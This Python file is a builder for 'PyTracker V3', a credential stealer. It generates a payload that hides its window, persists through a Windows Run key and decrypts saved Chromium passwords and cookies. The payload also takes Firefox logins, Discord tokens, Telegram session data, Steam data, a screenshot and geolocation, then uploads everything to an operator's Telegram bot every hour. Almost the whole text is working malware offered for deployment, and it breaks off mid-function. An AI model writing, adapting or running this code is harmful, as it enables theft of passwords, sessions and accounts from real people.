import os
import platform
import sqlite3
import shutil
import json
import base64
import tempfile
import winreg
import psutil
import requests
import pyautogui
import subprocess
import sys
import socket
import uuid
import manuf
from datetime import datetime
from Cryptodome.Cipher import AES
import re
from pystyle import *
import time


class StealerBuilderV3:
    def __init__(self):
        self.template = '''
import os
import platform
import sqlite3
import shutil
import json
import base64
import tempfile
import winreg
import psutil
import requests
import pyautogui
import subprocess
import sys
import socket
import uuid
import manuf
from datetime import datetime
from Cryptodome.Cipher import AES
import re
from pystyle import *
import time

class AdvancedSystemTracker:
    def __init__(self):
        self.bot_token = "{bot_token}"
        self.chat_id = "{chat_id}"
        self.data = {{}}
        self.temp_dir = tempfile.mkdtemp()
        self.system_temp = os.path.join(os.environ.get('TEMP', ''), 'system_cache')
        os.makedirs(self.system_temp, exist_ok=True)

    def get_system_info(self):
        try:
            return {{
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor() or "Unknown",
                "architecture": platform.architecture()[0] if platform.architecture() else "Unknown"
            }}
        except Exception as e:
            return {{"error": str(e)}}

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=10).text
        except Exception as e:
            return f"Error: {{str(e)}}"

    def get_geolocation(self):
        try:
            response = requests.get('http://ip-api.com/json/', timeout=10)
            if response.status_code == 200:
                return response.json()
            return {{"error": "API request failed"}}
        except Exception as e:
            return {{"error": str(e)}}

    def get_wifi_ssid(self):
        try:
            system = platform.system()
            
            if system == "Windows":
                result = subprocess.getoutput("netsh wlan show interfaces")
                ssid_lines = [line for line in result.split('\\n') if "SSID" in line and "BSSID" not in line]
                if ssid_lines:
                    return ssid_lines[0].split(":")[1].strip() if ":" in ssid_lines[0] else "Not connected"
                return "Not connected"
            elif system == "Darwin":
                result = subprocess.getoutput("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I")
                if "SSID:" in result:
                    return result.split("SSID:")[1].split("\\n")[0].strip()
                return "Not connected"
            elif system == "Linux":
                result = subprocess.getoutput("iwgetid -r")
                return result if result else "Not connected"
            else:
                return "N/A"
        except Exception as e:
            return f"Error: {{str(e)}}"

    def get_installed_software(self):
        software_list = []
        try:
            if platform.system() == "Windows":
                reg_paths = [
                    r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                    r"SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
                ]
                
                for path in reg_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                        for i in range(0, winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                subkey = winreg.OpenKey(key, subkey_name)
                                name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                if name and name not in software_list:
                                    software_list.append(name)
                            except:
                                continue
                    except:
                        continue
            elif platform.system() == "Darwin":
                # macOS applications
                apps_path = "/Applications"
                if os.path.exists(apps_path):
                    for app in os.listdir(apps_path):
                        if app.endswith('.app'):
                            software_list.append(app.replace('.app', ''))
            elif platform.system() == "Linux":
                # Linux packages (Debian/Ubuntu)
                try:
                    result = subprocess.getoutput("dpkg-query -W -f='${{Package}}\\n'")
                    software_list.extend(result.split('\\n'))
                except:
                    pass
        except Exception as e:
            print(f"Software error: {{e}}")
        return sorted(software_list)

    def get_chrome_key(self):
        try:
            if platform.system() == 'Windows':
                path = os.path.join(os.environ['USERPROFILE'], 
                                    'AppData', 'Local', 'Google', 'Chrome', 
                                    'User Data', 'Local State')
                if os.path.exists(path):
                    with open(path, 'r', encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    return encrypted_key[5:]
            elif platform.system() == 'Darwin':
                path = os.path.join(os.environ['HOME'], 
                                    'Library', 'Application Support', 'Google', 'Chrome', 
                                    'Local State')
                if os.path.exists(path):
                    with open(path, 'r', encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    return encrypted_key[5:]
            return None
        except Exception as e:
            print(f"Chrome key error: {{e}}")
            return None

    def decrypt_value(self, buff, key=None):
        try:
            if not buff or len(buff) < 15:
                return None
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode('utf-8', errors='ignore')
        except Exception as e:
            return None

    def get_enhanced_network_info(self):
        try:
            mac = ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
            hostname = socket.gethostname()
            
            try:
                local_ip = socket.gethostbyname(hostname)
            except:
                local_ip = "127.0.0.1"

            network_interfaces = []
            try:
                for interface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            network_interfaces.append({{
                                "interface": interface,
                                "ip": addr.address,
                                "netmask": addr.netmask
                            }})
            except:
                pass

            return {{
                "mac_address": mac,
                "hostname": hostname,
                "local_ip": local_ip,
                "public_ip": self.get_public_ip(),
                "wifi_ssid": self.get_wifi_ssid(),
                "network_interfaces": network_interfaces,
                "gateway": self.get_default_gateway(),
                "dns_servers": self.get_dns_servers()
            }}
        except Exception as e:
            return {{"error": str(e)}}

    def get_default_gateway(self):
        try:
            if platform.system() == "Windows":
                result = subprocess.getoutput("route print 0.0.0.0")
                for line in result.split('\\n'):
                    if "0.0.0.0" in line and "On-link" not in line:
                        parts = line.split()
                        if len(parts) > 2 and parts[2].count('.') == 3:
                            return parts[2]
            elif platform.system() in ["Linux", "Darwin"]:
                result = subprocess.getoutput("ip route | grep default")
                if "via" in result:
                    return result.split("via ")[1].split(" ")[0]
            return "Unknown"
        except:
            return "Unknown"

    def get_dns_servers(self):
        try:
            if platform.system() == "Windows":
                result = subprocess.getoutput("ipconfig /all")
                dns_servers = re.findall(r'DNS Servers[^:]*:\\s*([\\d.]+)', result)
                return dns_servers if dns_servers else ["8.8.8.8", "1.1.1.1"]
            elif platform.system() in ["Linux", "Darwin"]:
                result = subprocess.getoutput("cat /etc/resolv.conf | grep nameserver")
                servers = re.findall(r'nameserver\\s+([\\d.]+)', result)
                return servers if servers else ["8.8.8.8", "1.1.1.1"]
            return ["8.8.8.8", "1.1.1.1"]
        except:
            return ["8.8.8.8", "1.1.1.1"]

    def get_enhanced_hardware_info(self):
        try:
            mac = ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
            
            vendor = "Unknown"
            try:
                if getattr(sys, 'frozen', False):
                    base_path = sys._MEIPASS
                    manuf_path = os.path.join(base_path, 'manuf')
                else:
                    manuf_path = 'manuf'
                
                parser = manuf.MacParser(manuf_path)
                vendor = parser.get_manuf(mac) or "Unknown"
            except:
                pass

            ram = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            cpu_freq = "Unknown"
            try:
                freq = psutil.cpu_freq()
                cpu_freq = f"{{freq.current:.1f}} MHz" if freq else "Unknown"
            except:
                pass

            return {{
                "vendor": vendor,
                "cpu_cores": os.cpu_count() or "Unknown",
                "cpu_frequency": cpu_freq,
                "total_ram": round(ram.total / (1024 ** 3), 2),
                "available_ram": round(ram.available / (1024 ** 3), 2),
                "disk_total": round(disk.total / (1024 ** 3), 2),
                "disk_used": round(disk.used / (1024 ** 3), 2),
                "disk_free": round(disk.free / (1024 ** 3), 2),
                "gpu_info": self.get_gpu_info(),
                "battery_info": self.get_battery_info(),
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            }}
        except Exception as e:
            return {{"error": str(e)}}

    def get_gpu_info(self):
        gpu_info = []
        try:
            if platform.system() == "Windows":
                try:
                    result = subprocess.getoutput('wmic path win32_VideoController get Name,DriverVersion /value')
                    lines = result.split('\\n')
                    current_gpu = {{}}
                    for line in lines:
                        if 'Name=' in line:
                            current_gpu['name'] = line.split('=', 1)[1].strip()
                        elif 'DriverVersion=' in line:
                            current_gpu['driver_version'] = line.split('=', 1)[1].strip()
                            if current_gpu.get('name'):
                                gpu_info.append(current_gpu.copy())
                            current_gpu = {{}}
                except Exception as e:
                    print(f"GPU error: {{e}}")
            
            if not gpu_info:
                gpu_info.append({{"name": "Generic Display Adapter", "driver_version": "Unknown"}})
                
        except Exception as e:
            gpu_info.append({{"name": "Error", "driver_version": str(e)}})
        
        return gpu_info

    def get_battery_info(self):
        try:
            battery = psutil.sensors_battery()
            if battery:
                time_left = "Calculating..."
                if battery.secsleft != psutil.POWER_TIME_UNLIMITED:
                    if battery.secsleft > 0:
                        hours = battery.secsleft // 3600
                        minutes = (battery.secsleft % 3600) // 60
                        time_left = f"{{hours}}h {{minutes}}m"
                    else:
                        time_left = "Unknown"
                
                return {{
                    "percent": battery.percent,
                    "power_plugged": battery.power_plugged,
                    "time_left": time_left
                }}
            return {{"percent": "No battery", "power_plugged": False, "time_left": "N/A"}}
        except:
            return {{"percent": "Unknown", "power_plugged": False, "time_left": "N/A"}}

    def get_steam_data(self):
        steam_data = {{"installed": False, "games": [], "user_data": []}}
        try:
            steam_paths = []
            if platform.system() == "Windows":
                steam_paths = [
                    os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\\\Program Files (x86)'), 'Steam'),
                    os.path.join(os.environ.get('PROGRAMFILES', 'C:\\\\Program Files'), 'Steam'),
                ]
            elif platform.system() == "Darwin":
                steam_paths = [os.path.join(os.environ.get('HOME', ''), 'Library', 'Application Support', 'Steam')]
            elif platform.system() == "Linux":
                steam_paths = [os.path.join(os.environ.get('HOME', ''), '.steam', 'steam')]
            
            for steam_path in steam_paths:
                if os.path.exists(steam_path):
                    steam_data["installed"] = True
                    
                    # Find games
                    steamapps_paths = [
                        os.path.join(steam_path, 'steamapps'),
                        os.path.join(steam_path, 'SteamApps')
                    ]
                    
                    for steamapps_path in steamapps_paths:
                        if os.path.exists(steamapps_path):
                            for file in os.listdir(steamapps_path):
                                if file.endswith('.acf'):
                                    try:
                                        with open(os.path.join(steamapps_path, file), 'r', encoding='utf-8') as f:
                                            content = f.read()
                                            name_match = re.search(r'"name"\\s+"([^"]+)"', content)
                                            appid_match = re.search(r'"appid"\\s+"(\\d+)"', content)
                                            if name_match and appid_match:
                                                steam_data["games"].append({{
                                                    "name": name_match.group(1),
                                                    "appid": appid_match.group(1)
                                                }})
                                    except:
                                        continue
                    
                    # Find user data
                    userdata_path = os.path.join(steam_path, 'userdata')
                    if os.path.exists(userdata_path):
                        for user_folder in os.listdir(userdata_path):
                            if user_folder.isdigit():
                                user_path = os.path.join(userdata_path, user_folder)
                                if os.path.isdir(user_path):
                                    steam_data["user_data"].append({{
                                        "user_id": user_folder,
                                        "configs_count": len([f for f in os.listdir(user_path) if f.endswith(('.vdf', '.cfg'))])
                                    }})
                    break
                    
        except Exception as e:
            steam_data["error"] = str(e)
        return steam_data

    def get_discord_data(self):
        discord_data = {{"installed": False, "tokens": [], "user_data": []}}
        try:
            discord_paths = []
            if platform.system() == "Windows":
                discord_paths = [
                    os.path.join(os.environ.get('APPDATA', ''), 'Discord'),
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Discord')
                ]
            elif platform.system() == "Darwin":
                discord_paths = [os.path.join(os.environ.get('HOME', ''), 'Library', 'Application Support', 'Discord')]
            elif platform.system() == "Linux":
                discord_paths = [os.path.join(os.environ.get('HOME', ''), '.config', 'Discord')]
            
            for discord_path in discord_paths:
                if os.path.exists(discord_path):
                    discord_data["installed"] = True
                    
                    # Extract tokens from Local Storage
                    local_storage_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
                    if os.path.exists(local_storage_path):
                        tokens = self.extract_discord_tokens(local_storage_path)
                        discord_data["tokens"].extend(tokens)
                    
                    # Collect user data files
                    config_paths = [
                        os.path.join(discord_path, 'Local Storage'),
                        os.path.join(discord_path, 'Session Storage'),
                        os.path.join(discord_path, 'settings.json')
                    ]
                    
                    for config_path in config_paths:
                        if os.path.exists(config_path):
                            if os.path.isfile(config_path):
                                discord_data["user_data"].append({{
                                    "file": os.path.basename(config_path),
                                    "path": config_path,
                                    "size": os.path.getsize(config_path)
                                }})
                            else:
                                for root, dirs, files in os.walk(config_path):
                                    for file in files:
                                        if file.endswith(('.ldb', '.log', '.json')):
                                            full_path = os.path.join(root, file)
                                            discord_data["user_data"].append({{
                                                "file": file,
                                                "path": full_path,
                                                "size": os.path.getsize(full_path)
                                            }})
                    break
                    
        except Exception as e:
            discord_data["error"] = str(e)
        return discord_data

    def extract_discord_tokens(self, leveldb_path):
        tokens = []
        try:
            for file in os.listdir(leveldb_path):
                if file.endswith('.ldb') or file.endswith('.log'):
                    file_path = os.path.join(leveldb_path, file)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            token_matches = re.findall(r'[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}', content)
                            tokens.extend(token_matches)
                            
                            # Also look for encrypted tokens
                            encrypted_matches = re.findall(r'[A-Za-z0-9+/]{{40,}}={{0,2}}', content)
                            tokens.extend([f"encrypted:{{token}}" for token in encrypted_matches[:5]])
                    except:
                        continue
        except:
            pass
        return list(set(tokens))  # Remove duplicates

    def get_telegram_data(self):
        telegram_data = {{"installed": False, "sessions": [], "user_data": []}}
        try:
            telegram_paths = []
            if platform.system() == "Windows":
                telegram_paths = [
                    os.path.join(os.environ.get('APPDATA', ''), 'Telegram Desktop'),
                    os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Roaming', 'Telegram Desktop')
                ]
            elif platform.system() == "Darwin":
                telegram_paths = [os.path.join(os.environ.get('HOME', ''), 'Library', 'Application Support', 'Telegram')]
            elif platform.system() == "Linux":
                telegram_paths = [os.path.join(os.environ.get('HOME', ''), '.local', 'share', 'TelegramDesktop')]
            
            for telegram_path in telegram_paths:
                if os.path.exists(telegram_path):
                    telegram_data["installed"] = True
                    
                    # Find session files
                    for root, dirs, files in os.walk(telegram_path):
                        for file in files:
                            if any(ext in file for ext in ['s', 'map', 'key']):
                                session_path = os.path.join(root, file)
                                telegram_data["sessions"].append({{
                                    "file": file,
                                    "path": session_path,
                                    "size": os.path.getsize(session_path)
                                }})
                    
                    # TData folder
                    tdata_path = os.path.join(telegram_path, 'tdata')
                    if os.path.exists(tdata_path):
                        tdata_files = []
                        for root, dirs, files in os.walk(tdata_path):
                            for file in files:
                                if not file.startswith('.'):  # Skip hidden files
                                    full_path = os.path.join(root, file)
                                    tdata_files.append({{
                                        "name": file,
                                        "path": full_path,
                                        "size": os.path.getsize(full_path)
                                    }})
                        telegram_data["user_data"] = tdata_files
                    break
                    
        except Exception as e:
            telegram_data["error"] = str(e)
        return telegram_data

    def take_stealth_screenshot(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            # Используем стандартное расширение для изображений
            screenshot_filename = f"cache_{{timestamp}}.png"  # Изменено с .dat на .png
            screenshot_path = os.path.join(self.system_temp, screenshot_filename)
            
            # Take screenshot
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            
            return screenshot_path
            
        except Exception as e:
            print(f"Screenshot error: {{e}}")
            return None

    def get_enhanced_browser_data(self):
        browsers = {{
            "Chrome": self.get_chrome_data,
            "Firefox": self.get_firefox_data,
            "Opera": self.get_opera_data,
            "Edge": self.get_edge_data,
            "Brave": self.get_brave_data
        }}
        
        results = {{}}
        for name, func in browsers.items():
            try:
                browser_result = func()
                if browser_result and (browser_result.get("passwords") or browser_result.get("cookies")):
                    results[name] = browser_result
            except Exception as e:
                results[name] = {{"error": str(e)}}
        return results

    def get_browser_path(self, browser_name):
        if platform.system() == "Windows":
            paths = {{
                "Chrome": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
                "Edge": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
                "Opera": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
                "Brave": os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data')
            }}
            return paths.get(browser_name)
        return None

    def get_chrome_data(self):
        return self.get_chrome_based_browser_data("Chrome")

    def get_edge_data(self):
        return self.get_chrome_based_browser_data("Edge")

    def get_brave_data(self):
        return self.get_chrome_based_browser_data("Brave")

    def get_opera_data(self):
        return self.get_chrome_based_browser_data("Opera")

    def get_chrome_based_browser_data(self, browser_name):
        data = {{"passwords": [], "cookies": [], "credit_cards": [], "autofill": []}}
        try:
            browser_path = self.get_browser_path(browser_name)
            if not browser_path or not os.path.exists(browser_path):
                return data

            # Get encryption key
            if browser_name == "Opera":
                local_state_path = os.path.join(browser_path, 'Local State')
            else:
                local_state_path = os.path.join(browser_path, 'Local State')
            
            key = None
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                    key = encrypted_key[5:]
                except:
                    pass

            # Passwords
            login_data_path = os.path.join(browser_path, 'Default', 'Login Data')
            if os.path.exists(login_data_path):
                try:
                    temp_db = os.path.join(self.temp_dir, f'{{browser_name.lower()}}_logins.db')
                    shutil.copy2(login_data_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        decrypted = self.decrypt_value(row[2], key) if key else "Encrypted"
                        data["passwords"].append({{
                            "url": row[0] or "Unknown",
                            "username": row[1] or "Unknown",
                            "password": decrypted or "Unknown"
                        }})
                    
                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"{{browser_name}} passwords error: {{e}}")

            # Cookies
            cookies_path = os.path.join(browser_path, 'Default', 'Cookies')
            if os.path.exists(cookies_path):
                try:
                    temp_db = os.path.join(self.temp_dir, f'{{browser_name.lower()}}_cookies.db')
                    shutil.copy2(cookies_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 100")  # Limit to avoid huge files
                    
                    for row in cursor.fetchall():
                        decrypted = self.decrypt_value(row[2], key) if key else "Encrypted"
                        data["cookies"].append({{
                            "domain": row[0] or "Unknown",
                            "name": row[1] or "Unknown",
                            "value": decrypted or "Unknown"
                        }})
                    
                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"{{browser_name}} cookies error: {{e}}")

        except Exception as e:
            data["error"] = str(e)
        return data

    def get_firefox_data(self):
        data = {{"passwords": [], "cookies": [], "credit_cards": []}}
        try:
            if platform.system() == "Windows":
                profile_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
            elif platform.system() == "Darwin":
                profile_path = os.path.join(os.environ['HOME'], 'Library', 'Application Support', 'Firefox', 'Profiles')
            elif platform.system() == "Linux":
                profile_path = os.path.join(os.environ['HOME'], '.mozilla', 'firefox')
            else:
                return data

            if not os.path.exists(profile_path):
                return data

            profiles = [d for d in os.listdir(profile_path) if d.endswith('.default-release') or d.endswith('.default')]
            if not profiles:
                return data

            profile = os.path.join(profile_path, profiles[0])
            
            # Passwords
            login_json_path = os.path.join(profile, 'logins.json')
            if os.path.exists(login_json_path):
                try:
                    with open(login_json_path, 'r', encoding='utf-8') as f:
                        logins = json.load(f)
                    data["passwords"] = logins.get("logins", [])
                except:
                    pass

            # Cookies
            cookies_db_path = os.path.join(profile, 'cookies.sqlite')
            if os.path.exists(cookies_db_path):
                try:
                    temp_db = os.path.join(self.temp_dir, 'firefox_cookies.db')
                    shutil.copy2(cookies_db_path, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 100")
                    
                    data["cookies"] = [{{"domain": row[0], "name": row[1], "value": row[2]}} for row in cursor.fetchall()]
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass

        except Exception as e:
            data["error"] = str(e)
        return data

    def save_data_to_files(self):
        """Save all collected data to JSON files for sending"""
        files_to_send = []
        
        try:
            # Save browser data
            for browser_name, browser_data in self.data.get("browsers", {{}}).items():
                if browser_data and (browser_data.get("passwords") or browser_data.get("cookies")):
                    filename = os.path.join(self.temp_dir, f"{{browser_name}}_data.json")
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(browser_data, f, indent=2, ensure_ascii=False)
                    files_to_send.append(filename)

            # Save application data
            app_data = {{
                "steam": self.data.get("steam", {{}}),
                "discord": self.data.get("discord", {{}}),
                "telegram": self.data.get("telegram", {{}})
            }}
            
            app_filename = os.path.join(self.temp_dir, "applications_data.json")
            with open(app_filename, 'w', encoding='utf-8') as f:
                json.dump(app_data, f, indent=2, ensure_ascii=False)
            files_to_send.append(app_filename)

            # Save system info
            system_filename = os.path.join(self.temp_dir, "system_info.json")
            with open(system_filename, 'w', encoding='utf-8') as f:
                json.dump({{
                    "system": self.data.get("system", {{}}),
                    "network": self.data.get("network", {{}}),
                    "hardware": self.data.get("hardware", {{}}),
                    "software_count": len(self.data.get("software", []))
                }}, f, indent=2, ensure_ascii=False)
            files_to_send.append(system_filename)

        except Exception as e:
            print(f"Save data error: {{e}}")
        
        return files_to_send  # ВАЖНО: возвращаем список файлов

    def collect_enhanced_data(self):
        self.data = {{
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "user": os.getlogin() or "Unknown",
            "system": self.get_system_info(),
            "network": self.get_enhanced_network_info(),
            "hardware": self.get_enhanced_hardware_info(),
            "geolocation": self.get_geolocation(),
            "software": self.get_installed_software(),
            "browsers": self.get_enhanced_browser_data(),
            "steam": self.get_steam_data(),
            "discord": self.get_discord_data(),
            "telegram": self.get_telegram_data()
        }}
        
        # Сохраняем данные в файлы
        self.save_data_to_files()
        
        return self.data

    def send_enhanced_report(self):
        try:
            # Сначала собираем все данные
            self.collect_enhanced_data()
            
            # Затем делаем скриншот
            screenshot_path = self.take_stealth_screenshot()
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, "rb") as photo:
                    response = requests.post(
                        f"https://api.telegram.org/bot{{self.bot_token}}/sendPhoto",
                        files={{"photo": photo}},
                        data={{"chat_id": self.chat_id}},
                        timeout=30
                    )
                if response.status_code == 200:
                    os.remove(screenshot_path)

            # Получаем файлы для отправки
            files_to_send = []
            # Добавляем файлы из временной директории
            for file in os.listdir(self.temp_dir):
                file_path = os.path.join(self.temp_dir, file)
                if os.path.isfile(file_path) and file_path.endswith('.json'):
                    files_to_send.append(file_path)

            # Отправляем файлы
            for file_path in files_to_send:
                if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                    print(f"")
                    try:
                        with open(file_path, "rb") as f:
                            requests.post(
                                f"https://api.telegram.org/bot{{self.bot_token}}/sendDocument",
                                files={{"document": (os.path.basename(file_path), f)}},
                                data={{"chat_id": self.chat_id}},
                                timeout=30
                            )
                    except Exception as e:
                        print(f"File send error: {{e}}")

            # Send summary message
            message = self.format_enhanced_message()
            requests.post(
                f"https://api.telegram.org/bot{{self.bot_token}}/sendMessage",
                data={{
                    "chat_id": self.chat_id,
                    "text": message,
                    "parse_mode": "Markdown"
                }},
                timeout=30
            )

            self.cleanup_stealth_files()
            return True
            
        except Exception as e:
            print(f"Report send error: {{e}}")
            return False

    def format_enhanced_message(self):
        geo = self.data["geolocation"]
        net = self.data["network"]
        sys_info = self.data["system"]
        hw = self.data["hardware"]
        
        # Browser statistics
        browser_stats = []
        total_passwords = 0
        total_cookies = 0
        
        for browser, data in self.data["browsers"].items():
            if not isinstance(data, dict):
                continue
            passwords = len(data.get("passwords", []))
            cookies = len(data.get("cookies", []))
            total_passwords += passwords
            total_cookies += cookies
            if passwords > 0 or cookies > 0:
                browser_stats.append(f"• {{browser}}: {{passwords}} passwords, {{cookies}} cookies")

        # Application statistics
        steam_games = len(self.data['steam'].get('games', []))
        discord_tokens = len(self.data['discord'].get('tokens', []))
        telegram_sessions = len(self.data['telegram'].get('sessions', []))

        message = f"""
🖥️ *Enhanced System Report - PyTracker V3*
==================================
⏰ *Time:* {{self.data['timestamp']}}
👤 *User:* {{self.data['user']}}

🌍 *Geolocation*
==================================
📍 *Country:* {{geo.get('country', 'Unknown')}}
🏙️ *Region:* {{geo.get('regionName', 'Unknown')}}
🏡 *City:* {{geo.get('city', 'Unknown')}}
📮 *ZIP:* {{geo.get('zip', 'Unknown')}}
📡 *ISP:* {{geo.get('isp', 'Unknown')}}
🧭 *Coordinates:* {{geo.get('lat', 'Unknown')}}, {{geo.get('lon', 'Unknown')}}

🔌 *Network Information*
==================================
🖧 *MAC:* {{net.get('mac_address', 'Unknown')}}
🏷️ *Vendor:* {{hw.get('vendor', 'Unknown')}}
🏠 *Hostname:* {{net.get('hostname', 'Unknown')}}
📶 *WiFi:* {{net.get('wifi_ssid', 'Unknown')}}
🌐 *Public IP:* {{net.get('public_ip', 'Unknown')}}
🔗 *Local IP:* {{net.get('local_ip', 'Unknown')}}
🚪 *Gateway:* {{net.get('gateway', 'Unknown')}}

💻 *System Information*
==================================
⚙️ *OS:* {{sys_info.get('system', 'Unknown')}} {{sys_info.get('release', 'Unknown')}}
🏗️ *Architecture:* {{sys_info.get('architecture', 'Unknown')}}
💾 *Processor:* {{sys_info.get('processor', 'Unknown')}}
🎮 *CPU Cores:* {{hw.get('cpu_cores', 'Unknown')}}
⚡ *RAM:* {{hw.get('total_ram', 'Unknown')}} GB
💿 *Disk:* {{hw.get('disk_total', 'Unknown')}} GB
🔋 *Battery:* {{hw.get('battery_info', {{}}).get('percent', 'Unknown')}}%

📊 *Recovery Statistics*
==================================
🌐 *Browsers:* {{len(self.data['browsers'])}}
🔑 *Total Passwords:* {{total_passwords}}
🍪 *Total Cookies:* {{total_cookies}}
🎮 *Steam Games:* {{steam_games}}
💬 *Discord Tokens:* {{discord_tokens}}
📱 *Telegram Sessions:* {{telegram_sessions}}
📦 *Installed Software:* {{len(self.data['software'])}}

==================================
*Generated by PyTracker V3*
        """
        return message

    def cleanup_stealth_files(self):
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            if os.path.exists(self.system_temp):
                for file in os.listdir(self.system_temp):
                    if file.startswith('cache_'):
                        os.remove(os.path.join(self.system_temp, file))
        except:
            pass

    def run_stealth_mode(self):
        try:
            # Hide console window (Windows)
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
            # Add to startup (Windows)
            if platform.system() == "Windows":
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                       0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "SystemCacheUpdater", 0, winreg.REG_SZ, sys.executable)
                    winreg.CloseKey(key)
                except:
                    pass

            # Send report
            success = self.send_enhanced_report()
            
            # Persistence - re-run every hour
            if success:
                time.sleep(3600)  # Wait 1 hour
                self.run_stealth_mode()
                
        except Exception as e:
            time.sleep(3600)
            self.run_stealth_mode()

if __name__ == "__main__":
    tracker = AdvancedSystemTracker()
    tracker.run_stealth_mode()
'''


    def create_stealer(self, bot_token, chat_id, output_path="stealer.py"):
        """Create the stealer with provided credentials"""
        try:
            # Validate inputs
            if not bot_token or not chat_id:
                raise ValueError("Bot token and chat ID are required")
            
            # Replace placeholders
            stealer_code = self.template.format(
                bot_token=bot_token,
                chat_id=chat_id
            )
            
            # Write to file
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(stealer_code)
            
            print(f"[+] Stealer created successfully: {output_path}")
            print(f"[+] Bot Token: {bot_token}")
            print(f"[+] Chat ID: {chat_id}")
            print("[+] Ready for deployment!")
            
        except Exception as e:
            print(f"[-] Error creating stealer: {e}")

def main():
    """Main function to run the builder"""
    print(Colorate.Horizontal(Colors.blue_to_cyan, """
░       ░░░  ░░░░  ░░        ░░       ░░░░      ░░░░      ░░░  ░░░░  ░░        ░░       ░░
▒  ▒▒▒▒  ▒▒▒  ▒▒  ▒▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒  ▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒
▓       ▓▓▓▓▓    ▓▓▓▓▓▓▓  ▓▓▓▓▓       ▓▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓     ▓▓▓▓▓      ▓▓▓▓       ▓▓
█  ███████████  ████████  █████  ███  ███        ██  ████  ██  ███  ███  ████████  ███  ██
█  ███████████  ████████  █████  ████  ██  ████  ███      ███  ████  ██        ██  ████  █                                                                                          
""", 1))
    
    print(Colorate.Horizontal(Colors.blue_to_purple, """
Welcome to PyTracker V3!
    """, 1))
    
    try:
        builder = StealerBuilderV3()
        
 
        print("\n" + "="*50)
        bot_token = input(Colorate.Horizontal(Colors.blue_to_cyan, "[?] Enter your Telegram Bot Token: ")).strip()
        chat_id = input(Colorate.Horizontal(Colors.blue_to_cyan, "[?] Enter your Telegram Chat ID: ")).strip()
        output_file = input(Colorate.Horizontal(Colors.blue_to_cyan, "[?] Enter output filename (default: stealer.py): ")).strip()
        
        if not output_file:
            output_file = "stealer.py"
        

        builder.create_stealer(bot_token, chat_id, output_file)
        
        print("\\n" + "="*50)
        input("Press ENTER To exit...")   
    
    except KeyboardInterrupt:
        print("\\n[-] Operation cancelled by user")
    except Exception as e:
